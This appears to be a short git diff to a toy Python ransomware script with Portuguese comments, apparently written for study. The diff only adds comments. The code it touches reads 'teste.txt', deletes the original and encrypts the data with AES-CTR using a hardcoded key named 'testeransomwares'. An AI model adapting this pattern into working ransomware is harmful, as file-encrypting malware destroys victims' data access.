@@ -3,7 +3,7 @@ import pyaes #biblioteca de criptografia
 
 ## abrir o arquivo a ser criptografado
 file_name = "teste.txt"
-file = open(file_name, "rb")
+file = open(file_name, "rb") ##Le o arquivo
 file_data = file.read()
 file.close()
 
@@ -11,7 +11,8 @@ file.close()
 os.remove(file_name)
 
 ## chave de criptografia
-key = b"testeransomwares"
+key = b"testeransomwares" ##precisa ter 16 caracteres
+
 aes = pyaes.AESModeOfOperationCTR(key)
 
 ## criptografar o arquivo
